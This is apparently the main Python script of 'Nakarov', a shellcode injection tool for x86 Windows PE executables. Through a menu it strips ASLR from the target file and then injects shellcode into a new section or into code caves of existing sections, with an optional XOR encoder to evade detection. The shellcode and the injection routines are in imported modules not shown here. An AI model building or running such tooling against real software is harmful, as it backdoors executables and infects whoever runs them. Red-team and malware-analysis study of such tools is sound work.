import argparse
from aslr import * 
from inject_new_section import * 
from inject_existing_section import *
from coloroma_colors import *


# Argparser
parser = argparse.ArgumentParser(description='Nakarov shellcode injection tool. This tool only supports x86 files as of now')
requiredNamed = parser.add_argument_group('required arguments')
requiredNamed.add_argument('-f',
					help='Filename or path to PE file',
					required=True,
					dest='file')

parser.add_argument('-o', 
					help='Filename or path to new destination PE file',
					required=False,
					dest='outfile')

parser.add_argument('-xor',
					help='Use built-in shellcode XOR encoder',
					action="store_true",
					default=False,
					required=False,
					dest='xor')

args = parser.parse_args()


def print_menu():
	"""
	Prints the banner. 
	"""
	valid_options = [1, 2]
	print('================================================')
	print(' _   _   ___   _   __  ___  ______ _____  _   _')
	print(r'| \ | | / _ \ | | / / / _ \ | ___ \  _  || | | |')
	print(r'|  \| |/ /_\ \| |/ / / /_\ \| |_/ / | | || | | |')
	print(r'| . ` ||  _  ||    \ |  _  ||    /| | | || | | |')
	print(r'| |\  || | | || |\  \| | | || |\ \\ \_/ /\ \_/ /')
	print(r'\_| \_/\_| |_/\_| \_/\_| |_/\_| \_|\___/  \___/')
	print('\n')
	print('Author : Johnny Silverhand')
	print('================================================')
	print('')
	print('Option 1 : Inject shellcode into new section')
	print('Option 2 : Inject shellcode into existing section')
	while True:
		try:
			user_input = int(input(('Enter an option : ')))
			if user_input in valid_options:
				return user_input 
			else:
				print('Error : Invalid option entered!')
		except ValueError:
			print('Error : Invalid option entered!')


def remove_aslr(file_path):
	"""
	Removes the ASLR protection from the pefile if it is enabled.
	"""
	is_verify = False
	aslr_active = get_aslr_status(is_verify, file_path)
	if aslr_active:
		is_verify = True
		file_path = patch_aslr(file_path)
		get_aslr_status(is_verify, file_path)
	return file_path 


def inject_new_section(file_path):
	"""
	Injects a new section into the pefile.
	"""
	new_section_name = str(input('[*] Enter a new section name : '))
	print('')
	new_section_name = '.' + new_section_name
	ijs = InjectNewSection(file_path, new_section_name)
	ijs.add_new_section()
	ijs.inject_shellcode() 


def inject_existing_section(file_path):
	"""
	Injects shellcode into codecaves of already existing sections.
	"""
	ies = InjectExistingSection(file_path, cave_size=300, encode=args.xor)
	pe = ies.load_pefile()
	section, virtual_address, raw_address = ies.find_cave(pe)
	if section is None and virtual_address is None and raw_address is None:
		print(print_red('[!] No code caves found!'))
	else:
		ies.inject_shellcode(pe, section, virtual_address, raw_address)


def main():
	"""
	Main function.
	"""
	user_option = print_menu()
	file_path = args.file
	print('')
	try:
		file_path = remove_aslr(file_path)
		if user_option == 1:
			inject_new_section(file_path)
		elif user_option == 2:
			inject_existing_section(file_path)
		exit(-1)
	except OSError:
		print(print_red('[!] Error : Invalid file path provided!'))


if __name__ == '__main__':
	main()